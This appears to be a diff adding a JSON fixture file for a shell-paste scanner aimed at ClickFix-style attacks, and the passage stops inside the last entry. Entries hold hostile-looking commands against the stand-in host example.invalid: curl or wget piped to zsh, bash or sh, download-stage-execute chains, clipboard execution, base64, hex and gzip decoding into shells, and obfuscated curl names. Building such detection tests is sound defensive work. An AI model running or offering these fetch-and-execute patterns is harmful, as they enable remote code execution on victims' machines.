@@ -1,0 +1,2878 @@
+[
+  {
+    "fixture_id": "CF-SIMPLE-001",
+    "name": "Network retrieval piped to zsh",
+    "category": "simple",
+    "description": "Network retrieval piped to zsh supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/update | zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-SIMPLE-002",
+    "name": "Network retrieval piped to Bash",
+    "category": "simple",
+    "description": "Network retrieval piped to Bash supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/fix | bash",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "bash",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-SIMPLE-003",
+    "name": "Downloader piped to sh",
+    "category": "simple",
+    "description": "Downloader piped to sh supplied only as inert scanner data.",
+    "command_text": "wget -qO- https://example.invalid/install | sh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "sh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-SIMPLE-004",
+    "name": "Download followed by shell execution",
+    "category": "simple",
+    "description": "Download followed by shell execution supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/fix -o /tmp/msaa-test.sh ; zsh /tmp/msaa-test.sh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "download_stage_execute"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-SIMPLE-005",
+    "name": "Clipboard piped to shell",
+    "category": "simple",
+    "description": "Clipboard piped to shell supplied only as inert scanner data.",
+    "command_text": "pbpaste | zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "clipboard_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-SIMPLE-006",
+    "name": "Clipboard executed with shell -c",
+    "category": "simple",
+    "description": "Clipboard executed with shell -c supplied only as inert scanner data.",
+    "command_text": "zsh -c \"$(pbpaste)\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "clipboard_to_interpreter",
+      "command_substitution"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-SIMPLE-007",
+    "name": "Network content executed by shell -c",
+    "category": "simple",
+    "description": "Network content executed by shell -c supplied only as inert scanner data.",
+    "command_text": "zsh -c \"$(curl -fsSL https://example.invalid/fix)\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter",
+      "shell_c_execution"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-SIMPLE-008",
+    "name": "Network retrieval passed to eval",
+    "category": "simple",
+    "description": "Network retrieval passed to eval supplied only as inert scanner data.",
+    "command_text": "eval \"$(curl -fsSL https://example.invalid/fix)\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_eval",
+      "dynamic_execution"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-ENC-001",
+    "name": "Harmless Base64 content decoded into zsh",
+    "category": "encoding",
+    "description": "Harmless Base64 content decoded into zsh supplied only as inert scanner data.",
+    "command_text": "printf '%s' 'cHJpbnRmICdNU0FBX0NMSUNLRklYX1RFU1Rcbic=' | base64 -D | zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "decoded_content_to_interpreter",
+      "static_decoded_content"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-ENC-002",
+    "name": "Base64 decoded into Bash",
+    "category": "encoding",
+    "description": "Base64 decoded into Bash supplied only as inert scanner data.",
+    "command_text": "echo 'cHJpbnRmICdNU0FBX0NMSUNLRklYX1RFU1Rcbic=' | base64 --decode | bash",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "decoded_content_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-ENC-003",
+    "name": "OpenSSL Base64 decoding into shell",
+    "category": "encoding",
+    "description": "OpenSSL Base64 decoding into shell supplied only as inert scanner data.",
+    "command_text": "printf '%s' 'cHJpbnRmICdNU0FBX0NMSUNLRklYX1RFU1Rcbic=' | openssl base64 -d | sh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "decoded_content_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-ENC-004",
+    "name": "Hexadecimal reconstruction into zsh",
+    "category": "encoding",
+    "description": "Hexadecimal reconstruction into zsh supplied only as inert scanner data.",
+    "command_text": "printf '7072696e746620274d5341415f434c49434b4649585f544553545c6e27' | xxd -r -p | zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "decoded_content_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-ENC-005",
+    "name": "Decoder output captured and evaluated",
+    "category": "encoding",
+    "description": "Decoder output captured and evaluated supplied only as inert scanner data.",
+    "command_text": "x=\"$(printf '%s' 'cHJpbnRmICdNU0FBX0NMSUNLRklYX1RFU1Rcbic=' | base64 -D)\" ; eval \"$x\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "static_decoded_content",
+      "dynamic_execution"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-ENC-006",
+    "name": "Nested encoding",
+    "category": "encoding",
+    "description": "Nested encoding supplied only as inert scanner data.",
+    "command_text": "printf '%s' 'Y0hKcGJuUm1JQ2ROVTBGQlgwTk1TVU5MUmtsWVgxUkZVMVJjYmljPQ==' | base64 -D | base64 -D | zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "decoded_content_to_interpreter",
+      "multiple_decode_layers"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-ENC-007",
+    "name": "Base64 plus Gzip plus eval",
+    "category": "encoding",
+    "description": "Base64 plus Gzip plus eval supplied only as inert scanner data.",
+    "command_text": "eval \"$(printf '%s' 'H4sIAAAAAAAC/ysoyswrSVNQ9w12dIx39vF09nbzjIgPcQ0OiclTBwDmyIEAHQAAAA==' | base64 -D | gzip -d)\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "static_decoded_content",
+      "dynamic_execution"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-001",
+    "name": "Fragmented downloader name",
+    "category": "obfuscation",
+    "description": "Fragmented downloader name supplied only as inert scanner data.",
+    "command_text": "c='cu' ; r='rl' ; \"$c$r\" -fsSL https://example.invalid/fix | zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "warn",
+    "minimum_score": 4,
+    "required_rule_ids": [
+      "reconstructed_executable"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-002",
+    "name": "Fragmented interpreter name",
+    "category": "obfuscation",
+    "description": "Fragmented interpreter name supplied only as inert scanner data.",
+    "command_text": "s='z' ; h='sh' ; curl -fsSL https://example.invalid/fix | \"$s$h\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter",
+      "reconstructed_executable"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-003",
+    "name": "Escaped executable name",
+    "category": "obfuscation",
+    "description": "Escaped executable name supplied only as inert scanner data.",
+    "command_text": "c\\u\\r\\l -fsSL https://example.invalid/fix | zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter",
+      "execution_obfuscation_escaped_name"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-004",
+    "name": "printf reconstruction",
+    "category": "obfuscation",
+    "description": "printf reconstruction supplied only as inert scanner data.",
+    "command_text": "$(printf '%s%s' cu rl) -fsSL https://example.invalid/fix | zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter",
+      "command_name_reconstruction"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-005",
+    "name": "Reverse-string reconstruction",
+    "category": "obfuscation",
+    "description": "Reverse-string reconstruction supplied only as inert scanner data.",
+    "command_text": "name='lruc' ; printf '%s' \"$name\" | rev",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "warn",
+    "minimum_score": 4,
+    "required_rule_ids": [
+      "execution_obfuscation"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-006",
+    "name": "Character translation reconstruction",
+    "category": "obfuscation",
+    "description": "Character translation reconstruction supplied only as inert scanner data.",
+    "command_text": "printf 'dvsm' | tr 'd-v' 'c-u'",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "warn",
+    "minimum_score": 4,
+    "required_rule_ids": [
+      "execution_obfuscation"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-007",
+    "name": "Environment-variable interpreter",
+    "category": "obfuscation",
+    "description": "Environment-variable interpreter supplied only as inert scanner data.",
+    "command_text": "SHELL_RUNNER=zsh ; curl -fsSL https://example.invalid/fix | \"$SHELL_RUNNER\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter",
+      "environment_indirection"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-008",
+    "name": "Absolute-path binaries",
+    "category": "obfuscation",
+    "description": "Absolute-path binaries supplied only as inert scanner data.",
+    "command_text": "/usr/bin/curl -fsSL https://example.invalid/fix | /bin/zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-009",
+    "name": "Quoted command fragments",
+    "category": "obfuscation",
+    "description": "Quoted command fragments supplied only as inert scanner data.",
+    "command_text": "\"c\"\"u\"\"r\"\"l\" -fsSL https://example.invalid/fix | \"z\"\"s\"\"h\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-010",
+    "name": "Unicode whitespace",
+    "category": "obfuscation",
+    "description": "Unicode whitespace supplied only as inert scanner data.",
+    "command_text": "curl\u00a0-fsSL\u00a0https://example.invalid/fix\u00a0|\u00a0zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter",
+      "execution_obfuscation_unicode"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-011",
+    "name": "Zero-width insertion",
+    "category": "obfuscation",
+    "description": "Zero-width insertion supplied only as inert scanner data.",
+    "command_text": "cu\u200brl -fsSL https://example.invalid/fix | zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter",
+      "execution_obfuscation_unicode"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-012",
+    "name": "ANSI controls",
+    "category": "obfuscation",
+    "description": "ANSI controls supplied only as inert scanner data.",
+    "command_text": "\u001b[31mcurl -fsSL https://example.invalid/fix | zsh\u001b[0m",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter",
+      "execution_obfuscation_control"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-PASTE-001",
+    "name": "Command ending in newline",
+    "category": "multiline",
+    "description": "Command ending in newline supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/fix | zsh\n",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": true,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-PASTE-002",
+    "name": "Multiline staged execution",
+    "category": "multiline",
+    "description": "Multiline staged execution supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/fix -o /tmp/msaa-stage\nchmod +x /tmp/msaa-stage\n/tmp/msaa-stage",
+    "paste_origin": true,
+    "multiline": true,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "download_stage_execute"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-PASTE-003",
+    "name": "Benign line then suspicious",
+    "category": "multiline",
+    "description": "Benign line then suspicious supplied only as inert scanner data.",
+    "command_text": "echo 'Checking browser configuration'\ncurl -fsSL https://example.invalid/fix | zsh",
+    "paste_origin": true,
+    "multiline": true,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-PASTE-004",
+    "name": "Comments then suspicious",
+    "category": "multiline",
+    "description": "Comments then suspicious supplied only as inert scanner data.",
+    "command_text": "# Browser verification repair\n# Do not close this window\ncurl -fsSL https://example.invalid/fix | zsh",
+    "paste_origin": true,
+    "multiline": true,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-PASTE-005",
+    "name": "Backslash continuation",
+    "category": "multiline",
+    "description": "Backslash continuation supplied only as inert scanner data.",
+    "command_text": "curl -fsSL \\\nhttps://example.invalid/fix \\\n| zsh",
+    "paste_origin": true,
+    "multiline": true,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-PASTE-006",
+    "name": "Split paste final buffer",
+    "category": "multiline",
+    "description": "Split paste final buffer supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/fix | zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "Harness models two paste events but scans the complete final buffer at accept-line."
+  },
+  {
+    "fixture_id": "CF-PASTE-007",
+    "name": "Variable URL",
+    "category": "multiline",
+    "description": "Variable URL supplied only as inert scanner data.",
+    "command_text": "u=https://example.invalid/fix\ncurl -fsSL \"$u\" | zsh",
+    "paste_origin": true,
+    "multiline": true,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-STAGE-001",
+    "name": "Temporary script staging",
+    "category": "staging",
+    "description": "Temporary script staging supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/fix -o /tmp/.update ; chmod 700 /tmp/.update ; /tmp/.update",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "download_stage_execute"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-STAGE-002",
+    "name": "User cache staging",
+    "category": "staging",
+    "description": "User cache staging supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/fix -o \"$HOME/Library/Caches/.helper\" ; chmod +x \"$HOME/Library/Caches/.helper\" ; \"$HOME/Library/Caches/.helper\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "download_stage_execute"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-STAGE-003",
+    "name": "Static randomized temp name",
+    "category": "staging",
+    "description": "Static randomized temp name supplied only as inert scanner data.",
+    "command_text": "p=/tmp/.msaa-TEST-RANDOM ; curl -fsSL https://example.invalid/fix -o \"$p\" ; chmod +x \"$p\" ; \"$p\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "download_stage_execute"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-STAGE-004",
+    "name": "Download then source",
+    "category": "staging",
+    "description": "Download then source supplied only as inert scanner data.",
+    "command_text": "curl -fsSL https://example.invalid/fix -o /tmp/msaa-source ; source /tmp/msaa-source",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "download_stage_execute",
+      "downloaded_content_sourced"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
